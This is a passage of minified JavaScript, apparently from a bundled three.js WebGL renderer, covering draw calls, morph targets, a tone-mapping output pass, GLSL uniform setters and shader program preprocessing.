p)e.update(p[f],t.ARRAY_BUFFER)}function c(d){const p=[],f=d.index,y=d.attributes.position;let _=0;if(f!==null){const v=f.array;_=f.version;for(let x=0,S=v.length;x<S;x+=3){const E=v[x+0],A=v[x+1],C=v[x+2];p.push(E,A,A,C,C,E)}}else if(y!==void 0){const v=y.array;_=y.version;for(let x=0,S=v.length/3-1;x<S;x+=3){const E=x+0,A=x+1,C=x+2;p.push(E,A,A,C,C,E)}}else return;const g=new(iy(p)?ly:oy)(p,1);g.version=_;const u=r.get(d);u&&e.remove(u),r.set(d,g)}function h(d){const p=r.get(d);if(p){const f=d.index;f!==null&&p.version<f.version&&c(d)}else c(d);return r.get(d)}return{get:o,update:l,getWireframeAttribute:h}}function TT(t,e,n){let i;function s(p){i=p}let r,a;function o(p){r=p.type,a=p.bytesPerElement}function l(p,f){t.drawElements(i,f,r,p*a),n.update(f,i,1)}function c(p,f,y){y!==0&&(t.drawElementsInstanced(i,f,r,p*a,y),n.update(f,i,y))}function h(p,f,y){if(y===0)return;e.get("WEBGL_multi_draw").multiDrawElementsWEBGL(i,f,0,r,p,0,y);let g=0;for(let u=0;u<y;u++)g+=f[u];n.update(g,i,1)}function d(p,f,y,_){if(y===0)return;const g=e.get("WEBGL_multi_draw");if(g===null)for(let u=0;u<p.length;u++)c(p[u]/a,f[u],_[u]);else{g.multiDrawElementsInstancedWEBGL(i,f,0,r,p,0,_,0,y);let u=0;for(let v=0;v<y;v++)u+=f[v]*_[v];n.update(u,i,1)}}this.setMode=s,this.setIndex=o,this.render=l,this.renderInstances=c,this.renderMultiDraw=h,this.renderMultiDrawInstances=d}function AT(t){const e={geometries:0,textures:0},n={frame:0,calls:0,triangles:0,points:0,lines:0};function i(r,a,o){switch(n.calls++,a){case t.TRIANGLES:n.triangles+=o*(r/3);break;case t.LINES:n.lines+=o*(r/2);break;case t.LINE_STRIP:n.lines+=o*(r-1);break;case t.LINE_LOOP:n.lines+=o*r;break;case t.POINTS:n.points+=o*r;break;default:Ze("WebGLInfo: Unknown draw mode:",a);break}}function s(){n.calls=0,n.triangles=0,n.points=0,n.lines=0}return{memory:e,render:n,programs:null,autoReset:!0,reset:s,update:i}}function CT(t,e,n){const i=new WeakMap,s=new bt;function r(a,o,l){const c=a.morphTargetInfluences,h=o.morphAttributes.position||o.morphAttributes.normal||o.morphAttributes.color,d=h!==void 0?h.length:0;let p=i.get(o);if(p===void 0||p.count!==d){let M=function(){L.dispose(),i.delete(o),o.removeEventListener("dispose",M)};var f=M;p!==void 0&&p.texture.dispose();const y=o.morphAttributes.position!==void 0,_=o.morphAttributes.normal!==void 0,g=o.morphAttributes.color!==void 0,u=o.morphAttributes.position||[],v=o.morphAttributes.normal||[],x=o.morphAttributes.color||[];let S=0;y===!0&&(S=1),_===!0&&(S=2),g===!0&&(S=3);let E=o.attributes.position.count*S,A=1;E>e.maxTextureSize&&(A=Math.ceil(E/e.maxTextureSize),E=e.maxTextureSize);const C=new Float32Array(E*A*4*d),L=new sy(C,E,A,d);L.type=si,L.needsUpdate=!0;const w=S*4;for(let k=0;k<d;k++){const H=u[k],V=v[k],W=x[k],j=E*A*4*k;for(let X=0;X<H.count;X++){const D=X*w;y===!0&&(s.fromBufferAttribute(H,X),C[j+D+0]=s.x,C[j+D+1]=s.y,C[j+D+2]=s.z,C[j+D+3]=0),_===!0&&(s.fromBufferAttribute(V,X),C[j+D+4]=s.x,C[j+D+5]=s.y,C[j+D+6]=s.z,C[j+D+7]=0),g===!0&&(s.fromBufferAttribute(W,X),C[j+D+8]=s.x,C[j+D+9]=s.y,C[j+D+10]=s.z,C[j+D+11]=W.itemSize===4?s.w:1)}}p={count:d,texture:L,size:new Je(E,A)},i.set(o,p),o.addEventListener("dispose",M)}if(a.isInstancedMesh===!0&&a.morphTexture!==null)l.getUniforms().setValue(t,"morphTexture",a.morphTexture,n);else{let y=0;for(let g=0;g<c.length;g++)y+=c[g];const _=o.morphTargetsRelative?1:1-y;l.getUniforms().setValue(t,"morphTargetBaseInfluence",_),l.getUniforms().setValue(t,"morphTargetInfluences",c)}l.getUniforms().setValue(t,"morphTargetsTexture",p.texture,n),l.getUniforms().setValue(t,"morphTargetsTextureSize",p.size)}return{update:r}}function RT(t,e,n,i){let s=new WeakMap;function r(l){const c=i.render.frame,h=l.geometry,d=e.get(l,h);if(s.get(d)!==c&&(e.update(d),s.set(d,c)),l.isInstancedMesh&&(l.hasEventListener("dispose",o)===!1&&l.addEventListener("dispose",o),s.get(l)!==c&&(n.update(l.instanceMatrix,t.ARRAY_BUFFER),l.instanceColor!==null&&n.update(l.instanceColor,t.ARRAY_BUFFER),s.set(l,c))),l.isSkinnedMesh){const p=l.skeleton;s.get(p)!==c&&(p.update(),s.set(p,c))}return d}function a(){s=new WeakMap}function o(l){const c=l.target;c.removeEventListener("dispose",o),n.remove(c.instanceMatrix),c.instanceColor!==null&&n.remove(c.instanceColor)}return{update:r,dispose:a}}const kT={[V0]:"LINEAR_TONE_MAPPING",[H0]:"REINHARD_TONE_MAPPING",[G0]:"CINEON_TONE_MAPPING",[W0]:"ACES_FILMIC_TONE_MAPPING",[X0]:"AGX_TONE_MAPPING",[q0]:"NEUTRAL_TONE_MAPPING",[j0]:"CUSTOM_TONE_MAPPING"};function LT(t,e,n,i,s){const r=new ci(e,n,{type:t,depthBuffer:i,stencilBuffer:s}),a=new ci(e,n,{type:Ii,depthBuffer:!1,stencilBuffer:!1}),o=new Zn;o.setAttribute("position",new tn([-1,3,0,-1,-1,0,3,-1,0],3)),o.setAttribute("uv",new tn([0,2,0,0,2,0],2));const l=new xM({uniforms:{tDiffuse:{value:null}},vertexShader:`
			precision highp float;

			uniform mat4 modelViewMatrix;
			uniform mat4 projectionMatrix;

			attribute vec3 position;
			attribute vec2 uv;

			varying vec2 vUv;

			void main() {
				vUv = uv;
				gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
			}`,fragmentShader:`
			precision highp float;

			uniform sampler2D tDiffuse;

			varying vec2 vUv;

			#include <tonemapping_pars_fragment>
			#include <colorspace_pars_fragment>

			void main() {
				gl_FragColor = texture2D( tDiffuse, vUv );

				#ifdef LINEAR_TONE_MAPPING
					gl_FragColor.rgb = LinearToneMapping( gl_FragColor.rgb );
				#elif defined( REINHARD_TONE_MAPPING )
					gl_FragColor.rgb = ReinhardToneMapping( gl_FragColor.rgb );
				#elif defined( CINEON_TONE_MAPPING )
					gl_FragColor.rgb = CineonToneMapping( gl_FragColor.rgb );
				#elif defined( ACES_FILMIC_TONE_MAPPING )
					gl_FragColor.rgb = ACESFilmicToneMapping( gl_FragColor.rgb );
				#elif defined( AGX_TONE_MAPPING )
					gl_FragColor.rgb = AgXToneMapping( gl_FragColor.rgb );
				#elif defined( NEUTRAL_TONE_MAPPING )
					gl_FragColor.rgb = NeutralToneMapping( gl_FragColor.rgb );
				#elif defined( CUSTOM_TONE_MAPPING )
					gl_FragColor.rgb = CustomToneMapping( gl_FragColor.rgb );
				#endif

				#ifdef SRGB_TRANSFER
					gl_FragColor = sRGBTransferOETF( gl_FragColor );
				#endif
			}`,depthTest:!1,depthWrite:!1}),c=new In(o,l),h=new Ap(-1,1,1,-1,0,1);let d=null,p=null,f=!1,y,_=null,g=[],u=!1;this.setSize=function(v,x){r.setSize(v,x),a.setSize(v,x);for(let S=0;S<g.length;S++){const E=g[S];E.setSize&&E.setSize(v,x)}},this.setEffects=function(v){g=v,u=g.length>0&&g[0].isRenderPass===!0;const x=r.width,S=r.height;for(let E=0;E<g.length;E++){const A=g[E];A.setSize&&A.setSize(x,S)}},this.begin=function(v,x){if(f||v.toneMapping===li&&g.length===0)return!1;if(_=x,x!==null){const S=x.width,E=x.height;(r.width!==S||r.height!==E)&&this.setSize(S,E)}return u===!1&&v.setRenderTarget(r),y=v.toneMapping,v.toneMapping=li,!0},this.hasRenderPass=function(){return u},this.end=function(v,x){v.toneMapping=y,f=!0;let S=r,E=a;for(let A=0;A<g.length;A++){const C=g[A];if(C.enabled!==!1&&(C.render(v,E,S,x),C.needsSwap!==!1)){const L=S;S=E,E=L}}if(d!==v.outputColorSpace||p!==v.toneMapping){d=v.outputColorSpace,p=v.toneMapping,l.defines={},je.getTransfer(d)===it&&(l.defines.SRGB_TRANSFER="");const A=kT[p];A&&(l.defines[A]=""),l.needsUpdate=!0}l.uniforms.tDiffuse.value=S.texture,v.setRenderTarget(_),v.render(c,h),_=null,f=!1},this.isCompositing=function(){return f},this.dispose=function(){r.dispose(),a.dispose(),o.dispose(),l.dispose()}}const gy=new Yt,ph=new $a(1,1),vy=new sy,yy=new qw,xy=new dy,Gm=[],Wm=[],jm=new Float32Array(16),Xm=new Float32Array(9),qm=new Float32Array(4);function jr(t,e,n){const i=t[0];if(i<=0||i>0)return t;const s=e*n;let r=Gm[s];if(r===void 0&&(r=new Float32Array(s),Gm[s]=r),e!==0){i.toArray(r,0);for(let a=1,o=0;a!==e;++a)o+=n,t[a].toArray(r,o)}return r}function Lt(t,e){if(t.length!==e.length)return!1;for(let n=0,i=t.length;n<i;n++)if(t[n]!==e[n])return!1;return!0}function Pt(t,e){for(let n=0,i=e.length;n<i;n++)t[n]=e[n]}function cc(t,e){let n=Wm[e];n===void 0&&(n=new Int32Array(e),Wm[e]=n);for(let i=0;i!==e;++i)n[i]=t.allocateTextureUnit();return n}function PT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1f(this.addr,e),n[0]=e)}function NT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2f(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(Lt(n,e))return;t.uniform2fv(this.addr,e),Pt(n,e)}}function IT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3f(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else if(e.r!==void 0)(n[0]!==e.r||n[1]!==e.g||n[2]!==e.b)&&(t.uniform3f(this.addr,e.r,e.g,e.b),n[0]=e.r,n[1]=e.g,n[2]=e.b);else{if(Lt(n,e))return;t.uniform3fv(this.addr,e),Pt(n,e)}}function DT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4f(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(Lt(n,e))return;t.uniform4fv(this.addr,e),Pt(n,e)}}function UT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(Lt(n,e))return;t.uniformMatrix2fv(this.addr,!1,e),Pt(n,e)}else{if(Lt(n,i))return;qm.set(i),t.uniformMatrix2fv(this.addr,!1,qm),Pt(n,i)}}function OT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(Lt(n,e))return;t.uniformMatrix3fv(this.addr,!1,e),Pt(n,e)}else{if(Lt(n,i))return;Xm.set(i),t.uniformMatrix3fv(this.addr,!1,Xm),Pt(n,i)}}function FT(t,e){const n=this.cache,i=e.elements;if(i===void 0){if(Lt(n,e))return;t.uniformMatrix4fv(this.addr,!1,e),Pt(n,e)}else{if(Lt(n,i))return;jm.set(i),t.uniformMatrix4fv(this.addr,!1,jm),Pt(n,i)}}function BT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1i(this.addr,e),n[0]=e)}function zT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2i(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(Lt(n,e))return;t.uniform2iv(this.addr,e),Pt(n,e)}}function VT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3i(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else{if(Lt(n,e))return;t.uniform3iv(this.addr,e),Pt(n,e)}}function HT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4i(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(Lt(n,e))return;t.uniform4iv(this.addr,e),Pt(n,e)}}function GT(t,e){const n=this.cache;n[0]!==e&&(t.uniform1ui(this.addr,e),n[0]=e)}function WT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y)&&(t.uniform2ui(this.addr,e.x,e.y),n[0]=e.x,n[1]=e.y);else{if(Lt(n,e))return;t.uniform2uiv(this.addr,e),Pt(n,e)}}function jT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z)&&(t.uniform3ui(this.addr,e.x,e.y,e.z),n[0]=e.x,n[1]=e.y,n[2]=e.z);else{if(Lt(n,e))return;t.uniform3uiv(this.addr,e),Pt(n,e)}}function XT(t,e){const n=this.cache;if(e.x!==void 0)(n[0]!==e.x||n[1]!==e.y||n[2]!==e.z||n[3]!==e.w)&&(t.uniform4ui(this.addr,e.x,e.y,e.z,e.w),n[0]=e.x,n[1]=e.y,n[2]=e.z,n[3]=e.w);else{if(Lt(n,e))return;t.uniform4uiv(this.addr,e),Pt(n,e)}}function qT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s);let r;this.type===t.SAMPLER_2D_SHADOW?(ph.compareFunction=n.isReversedDepthBuffer()?_p:xp,r=ph):r=gy,n.setTexture2D(e||r,s)}function YT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTexture3D(e||yy,s)}function $T(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTextureCube(e||xy,s)}function KT(t,e,n){const i=this.cache,s=n.allocateTextureUnit();i[0]!==s&&(t.uniform1i(this.addr,s),i[0]=s),n.setTexture2DArray(e||vy,s)}function ZT(t){switch(t){case 5126:return PT;case 35664:return NT;case 35665:return IT;case 35666:return DT;case 35674:return UT;case 35675:return OT;case 35676:return FT;case 5124:case 35670:return BT;case 35667:case 35671:return zT;case 35668:case 35672:return VT;case 35669:case 35673:return HT;case 5125:return GT;case 36294:return WT;case 36295:return jT;case 36296:return XT;case 35678:case 36198:case 36298:case 36306:case 35682:return qT;case 35679:case 36299:case 36307:return YT;case 35680:case 36300:case 36308:case 36293:return $T;case 36289:case 36303:case 36311:case 36292:return KT}}function JT(t,e){t.uniform1fv(this.addr,e)}function QT(t,e){const n=jr(e,this.size,2);t.uniform2fv(this.addr,n)}function eA(t,e){const n=jr(e,this.size,3);t.uniform3fv(this.addr,n)}function tA(t,e){const n=jr(e,this.size,4);t.uniform4fv(this.addr,n)}function nA(t,e){const n=jr(e,this.size,4);t.uniformMatrix2fv(this.addr,!1,n)}function iA(t,e){const n=jr(e,this.size,9);t.uniformMatrix3fv(this.addr,!1,n)}function sA(t,e){const n=jr(e,this.size,16);t.uniformMatrix4fv(this.addr,!1,n)}function rA(t,e){t.uniform1iv(this.addr,e)}function aA(t,e){t.uniform2iv(this.addr,e)}function oA(t,e){t.uniform3iv(this.addr,e)}function lA(t,e){t.uniform4iv(this.addr,e)}function cA(t,e){t.uniform1uiv(this.addr,e)}function uA(t,e){t.uniform2uiv(this.addr,e)}function dA(t,e){t.uniform3uiv(this.addr,e)}function hA(t,e){t.uniform4uiv(this.addr,e)}function pA(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Lt(i,r)||(t.uniform1iv(this.addr,r),Pt(i,r));let a;this.type===t.SAMPLER_2D_SHADOW?a=ph:a=gy;for(let o=0;o!==s;++o)n.setTexture2D(e[o]||a,r[o])}function fA(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Lt(i,r)||(t.uniform1iv(this.addr,r),Pt(i,r));for(let a=0;a!==s;++a)n.setTexture3D(e[a]||yy,r[a])}function mA(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Lt(i,r)||(t.uniform1iv(this.addr,r),Pt(i,r));for(let a=0;a!==s;++a)n.setTextureCube(e[a]||xy,r[a])}function gA(t,e,n){const i=this.cache,s=e.length,r=cc(n,s);Lt(i,r)||(t.uniform1iv(this.addr,r),Pt(i,r));for(let a=0;a!==s;++a)n.setTexture2DArray(e[a]||vy,r[a])}function vA(t){switch(t){case 5126:return JT;case 35664:return QT;case 35665:return eA;case 35666:return tA;case 35674:return nA;case 35675:return iA;case 35676:return sA;case 5124:case 35670:return rA;case 35667:case 35671:return aA;case 35668:case 35672:return oA;case 35669:case 35673:return lA;case 5125:return cA;case 36294:return uA;case 36295:return dA;case 36296:return hA;case 35678:case 36198:case 36298:case 36306:case 35682:return pA;case 35679:case 36299:case 36307:return fA;case 35680:case 36300:case 36308:case 36293:return mA;case 36289:case 36303:case 36311:case 36292:return gA}}class yA{constructor(e,n,i){this.id=e,this.addr=i,this.cache=[],this.type=n.type,this.setValue=ZT(n.type)}}class xA{constructor(e,n,i){this.id=e,this.addr=i,this.cache=[],this.type=n.type,this.size=n.size,this.setValue=vA(n.type)}}class _A{constructor(e){this.id=e,this.seq=[],this.map={}}setValue(e,n,i){const s=this.seq;for(let r=0,a=s.length;r!==a;++r){const o=s[r];o.setValue(e,n[o.id],i)}}}const wu=/(\w+)(\])?(\[|\.)?/g;function Ym(t,e){t.seq.push(e),t.map[e.id]=e}function bA(t,e,n){const i=t.name,s=i.length;for(wu.lastIndex=0;;){const r=wu.exec(i),a=wu.lastIndex;let o=r[1];const l=r[2]==="]",c=r[3];if(l&&(o=o|0),c===void 0||c==="["&&a+2===s){Ym(n,c===void 0?new yA(o,t,e):new xA(o,t,e));break}else{let d=n.map[o];d===void 0&&(d=new _A(o),Ym(n,d)),n=d}}}class pl{constructor(e,n){this.seq=[],this.map={};const i=e.getProgramParameter(n,e.ACTIVE_UNIFORMS);for(let a=0;a<i;++a){const o=e.getActiveUniform(n,a),l=e.getUniformLocation(n,o.name);bA(o,l,this)}const s=[],r=[];for(const a of this.seq)a.type===e.SAMPLER_2D_SHADOW||a.type===e.SAMPLER_CUBE_SHADOW||a.type===e.SAMPLER_2D_ARRAY_SHADOW?s.push(a):r.push(a);s.length>0&&(this.seq=s.concat(r))}setValue(e,n,i,s){const r=this.map[n];r!==void 0&&r.setValue(e,i,s)}setOptional(e,n,i){const s=n[i];s!==void 0&&this.setValue(e,i,s)}static upload(e,n,i,s){for(let r=0,a=n.length;r!==a;++r){const o=n[r],l=i[o.id];l.needsUpdate!==!1&&o.setValue(e,l.value,s)}}static seqWithValue(e,n){const i=[];for(let s=0,r=e.length;s!==r;++s){const a=e[s];a.id in n&&i.push(a)}return i}}function $m(t,e,n){const i=t.createShader(e);return t.shaderSource(i,n),t.compileShader(i),i}const SA=37297;let wA=0;function MA(t,e){const n=t.split(`
`),i=[],s=Math.max(e-6,0),r=Math.min(e+6,n.length);for(let a=s;a<r;a++){const o=a+1;i.push(`${o===e?">":" "} ${o}: ${n[a]}`)}return i.join(`
`)}const Km=new Ue;function EA(t){je._getMatrix(Km,je.workingColorSpace,t);const e=`mat3( ${Km.elements.map(n=>n.toFixed(4))} )`;switch(je.getTransfer(t)){case Bl:return[e,"LinearTransferOETF"];case it:return[e,"sRGBTransferOETF"];default:return Ie("WebGLProgram: Unsupported color space: ",t),[e,"LinearTransferOETF"]}}function Zm(t,e,n){const i=t.getShaderParameter(e,t.COMPILE_STATUS),r=(t.getShaderInfoLog(e)||"").trim();if(i&&r==="")return"";const a=/ERROR: 0:(\d+)/.exec(r);if(a){const o=parseInt(a[1]);return n.toUpperCase()+`

`+r+`

`+MA(t.getShaderSource(e),o)}else return r}function TA(t,e){const n=EA(e);return[`vec4 ${t}( vec4 value ) {`,`	return ${n[1]}( vec4( value.rgb * ${n[0]}, value.a ) );`,"}"].join(`
`)}const AA={[V0]:"Linear",[H0]:"Reinhard",[G0]:"Cineon",[W0]:"ACESFilmic",[X0]:"AgX",[q0]:"Neutral",[j0]:"Custom"};function CA(t,e){const n=AA[e];return n===void 0?(Ie("WebGLProgram: Unsupported toneMapping:",e),"vec3 "+t+"( vec3 color ) { return LinearToneMapping( color ); }"):"vec3 "+t+"( vec3 color ) { return "+n+"ToneMapping( color ); }"}const $o=new G;function RA(){je.getLuminanceCoefficients($o);const t=$o.x.toFixed(4),e=$o.y.toFixed(4),n=$o.z.toFixed(4);return["float luminance( const in vec3 rgb ) {",`	const vec3 weights = vec3( ${t}, ${e}, ${n} );`,"	return dot( weights, rgb );","}"].join(`
`)}function kA(t){return[t.extensionClipCullDistance?"#extension GL_ANGLE_clip_cull_distance : require":"",t.extensionMultiDraw?"#extension GL_ANGLE_multi_draw : require":""].filter(ma).join(`
`)}function LA(t){const e=[];for(const n in t){const i=t[n];i!==!1&&e.push("#define "+n+" "+i)}return e.join(`
`)}function PA(t,e){const n={},i=t.getProgramParameter(e,t.ACTIVE_ATTRIBUTES);for(let s=0;s<i;s++){const r=t.getActiveAttrib(e,s),a=r.name;let o=1;r.type===t.FLOAT_MAT2&&(o=2),r.type===t.FLOAT_MAT3&&(o=3),r.type===t.FLOAT_MAT4&&(o=4),n[a]={type:r.type,location:t.getAttribLocation(e,a),locationSize:o}}return n}function ma(t){return t!==""}function Jm(t,e){const n=e.numSpotLightShadows+e.numSpotLightMaps-e.numSpotLightShadowsWithMaps;return t.replace(/NUM_DIR_LIGHTS/g,e.numDirLights).replace(/NUM_SPOT_LIGHTS/g,e.numSpotLights).replace(/NUM_SPOT_LIGHT_MAPS/g,e.numSpotLightMaps).replace(/NUM_SPOT_LIGHT_COORDS/g,n).replace(/NUM_RECT_AREA_LIGHTS/g,e.numRectAreaLights).replace(/NUM_POINT_LIGHTS/g,e.numPointLights).replace(/NUM_HEMI_LIGHTS/g,e.numHemiLights).replace(/NUM_DIR_LIGHT_SHADOWS/g,e.numDirLightShadows).replace(/NUM_SPOT_LIGHT_SHADOWS_WITH_MAPS/g,e.numSpotLightShadowsWithMaps).replace(/NUM_SPOT_LIGHT_SHADOWS/g,e.numSpotLightShadows).replace(/NUM_POINT_LIGHT_SHADOWS/g,e.numPointLightShadows)}function Qm(t,e){return t.replace(/NUM_CLIPPING_PLANES/g,e.numClippingPlanes).replace(/UNION_CLIPPING_PLANES/g,e.numClippingPlanes-e.numClipIntersection)}const NA=/^[ \t]*#include +<([\w\d./]+)>/gm;function fh(t){return t.replace(NA,DA)}const IA=new Map;function DA(t,e){let n=Oe[e];if(n===void 0){const i=IA.get(e);if(i!==void 0)n=Oe[i],Ie('WebGLRenderer: Shader chunk "%s" has been deprecated. Use "%s" instead.',e,i);else throw new Error("Can not resolve #include <"+e+">")}return fh(n)}const UA=/#pragma unroll_loop_start\s+for\s*\(\s*int\s+i\s*=\s*(\d+)\s*;\s*i\s*<\s*(\d+)\s*;\s*i\s*\+\+\s*\)\s*{([\s\S]+?)}\s+#pragma unroll_loop_end/g;function eg(t){return t.replace(UA,OA)}function OA(t,e,n,i){let s="";for(let r=parseInt(e);r<parseInt(n);r++)s+=i.replace(/\[\s*i\s*\]/g,"[ "+r+" ]").replace(/UNROLLED_LOOP_INDEX/g,r);return s}function tg(t){let e=`precision ${t.precision} float;
	precision ${t.precision} int;
	precision ${t.precision} sampler2D;
	precision ${t.precision} samplerCube;
	precision ${t.precision} sampler3D;
	precision ${t.precision} sampler2DArray;
	precision ${t.precision} sampler2DShadow;
	precision ${t.precision} samplerCubeShadow;
	precision ${t.precision} sampler2DArrayShadow;
	precision ${t.precision} isampler2D;
	precision ${t.precision} isampler3D;
	precision ${t.precision} isamplerCube;
	precision ${t.precision} isampler2DArray;
	precision ${t.precision} usampler2D;
	precision ${t.precision} usampler3D;
	precision ${t.precision} usamplerCube;
	precision ${t.precision} usampler2DArray;
	`;return t.precision==="highp"?e+=`
#define HIGH_PRECISION`:t.precision==="mediump"?e+=`
#define MEDIUM_PRECISION`:t.precision==="lowp"&&(e+=`
#define LOW_PRECISION`),e}const FA={[ll]:"SHADOWMAP_TYPE_PCF",[pa]:"SHADOWMAP_TYPE_VSM"};function BA(t){return FA[t.shadowMapType]||"SHADOWMAP_TYPE_BASIC"}const zA={[Vs]:"ENVMAP_TYPE_CUBE",[Ur]:"ENVMAP_TYPE_CUBE",[ac]:"ENVMAP_TYPE_CUBE_UV"};function VA(t){return t.envMap===!1?"ENVMAP_TYPE_CUBE":zA[t.envMapMode]||"ENVMAP_TYPE_CUBE"}const HA={[Ur]:"ENVMAP_MODE_REFRACTION"};function GA(t){return t.envMap===!1?"ENVMAP_MODE_REFLECTION":HA[t.envMapMode]||"ENVMAP_MODE_REFLECTION"}const WA={[z0]:"ENVMAP_BLENDING_MULTIPLY",[Cw]:"ENVMAP_BLENDING_MIX",[Rw]:"ENVMAP_BLENDING_ADD"};function jA(t){return t.envMap===!1?"ENVMAP_BLENDING_NONE":WA[t.combine]||"ENVMAP_BLENDING_NONE"}function XA(t){const e=t.envMapCubeUVHeight;if(e===null)return null;const n=Math.log2(e)-2,i=1/e;return{texelWidth:1/(3*Math.max(Math.pow(2,n),7*16)),texelHeight:i,maxMip:n}}function qA(t,e,n,i){const s=t.getContext(),r=n.defines;let a=n.vertexShader,o=n.fragmentShader;const l=BA(n),c=VA(n),h=GA(n),d=jA(n),p=XA(n),f=kA(n),y=LA(r),_=s.createProgram();let g,u,v=n.glslVersion?"#version "+n.glslVersion+`
`:"";n.isRawShaderMaterial?(g=["#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,y].filter(ma).join(`
`),g.length>0&&(g+=`
`),u=["#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,y].filter(ma).join(`
`),u.length>0&&(u+=`
`)):(g=[tg(n),"#define SHADER_TYPE "+n.shaderType,"#define SHADER_NAME "+n.shaderName,y,n.extensionClipCullDistance?"#define USE_CLIP_DISTANCE":"",n.batching?"#define USE_BATCHING":"",n.batchingColor?"#define USE_BATCHING_COLOR":"",n.instancing?"#define USE_INSTANCING":"",n.instancingColor?"#define USE_INSTANCING_COLOR":"",n.instancingMorph?"#define USE_INSTANCING_MORPH":"",n.useFog&&n.fog?"#define USE_FOG":"",n.useFog&&n.fogExp2?"#define FOG_EXP2":"",n.map?"#define USE_MAP":"",n.envMap?"#define USE_ENVMAP":"",n.envMap?"#define "+h:"",n.lightMap?"#define USE_LIGHTMAP":"",n.aoMap?"#define USE_AOMAP":"",n.bumpMap?"#define USE_BUMPMAP":"",n.normalMap?"#define USE_NORMALMAP":"",n.normalMapObjectSpace?"#define USE_NORMALMAP_OBJECTSPACE":"",n.normalMapTangentSpace?"#define USE_NORMALMAP_TANGENTSPACE":"",n.displacementMap?"#define USE_DISPLACEMENTMAP":"",n.emissiveMap?"#define USE_EMISSIVEMAP":"",n.anisotropy?"#define USE_ANISOTROPY":"",n.anisotropyMap?"#define USE_ANISOTROPYMAP":"",n.clearcoatMap?"#define USE_CLEARCOATMAP":"",n.clearcoatRoughnessMap?"#define USE_CLEARCOAT_ROUGHNESSMAP":"",n.clearcoatNormalMap?"#define USE_CLEARCOAT_NORMALMAP":"",n.iridescenceMap?"#define USE_IRIDESCENCEMAP":"",n.iridescenceThicknessMap?"#define USE_IRIDESCENCE_THICKNESSMAP":"",n.specularMap?"#define USE_SPECULARMAP":"",n.specularColorMap?"#define USE_SPECULAR_COLORMAP":"",n.specularIntensityMap?"#define USE_SPECULAR_INTENSITYMAP":"",n.roughnessMap?"#define USE_ROUGHNESSMAP":"",n.metalnessMap?"#define USE_METALNESSMAP":"",n.alphaMap?"#define USE_ALPHAMAP":"",n.alphaHash?"#define USE_ALPHAHASH":"",n.transmission?"#define USE_TRANSMISSION":"",n.transmissionMap?"#define USE_TRANSMISSIONMAP":"",n.thicknessMap?"#define USE_THICKNESSMAP":"",n.sheenColorMap?"#define USE_SHEEN_COLORMAP":"",n.sheenRoughnessMap?"#define USE_SHEEN_ROUGHNESSMAP":"",n.mapUv?"#define MAP_UV "+n.mapUv:"",n.alphaMapUv?"#define ALPHAMAP_UV "+n.alphaMapUv:"",n.lightMapUv?"#define LIGHTMAP_UV "+n.lightMapUv:"",n.aoMapUv?"#define AOMAP_UV "+n.aoMapUv:"",n.emissiveMapUv?"#define EMISSIVEMAP_UV "+n.emissiveMapUv:"",n.bumpMapUv?"#define BUMPMAP_UV "+n.bumpMapUv:"",n.normalMapUv?"#define NORMALMAP_UV "+n.normalMapUv:"",n.displacementMapUv?"#define DISPLACEMENTMAP_UV "+n.displacementMapUv:"",n.metalnessMapUv?"#define METALNESSMAP_UV "+n.metalnessMapUv:"",n.roughnessMapUv?"#define ROUGHNESSMAP_UV "+n.roughnessMapUv:"",n.anisotropyMapUv?"#define ANISOTROPYMAP_UV "+n.anisotropyMapUv:"",n.clearcoatMapUv?"#define CLEARCOATMAP_UV "+n.clearcoatMapUv:"",n.clearcoatNormalMapUv?"#define CLEARCOAT_NORMALMAP_UV "+n.clearcoatNormalMapUv:"",n.clearcoatRoughnessMapUv?"#define CLEARCOAT_ROUGHNESSMAP_UV "+n.clearcoatRoughnessMapUv:"",n.iridescenceMapUv?"#define IRIDESCENCEMAP_UV "+n.iridescenceMapUv:"",n.iridescenceThicknessMapUv?"#define IRIDESCENCE_THICKNESSMAP_UV "+n.iridescenceThicknessMapUv:"",n.sheenColorMapUv?"#define SHEEN_COLORMAP_UV "+n.sheenColorMapUv:"",n.sheenRoughnessMapUv?"#define SHEEN_ROUGHNESSMAP_UV "+n.sheenRoughnessMapUv:"",n.specularMapUv?"#define 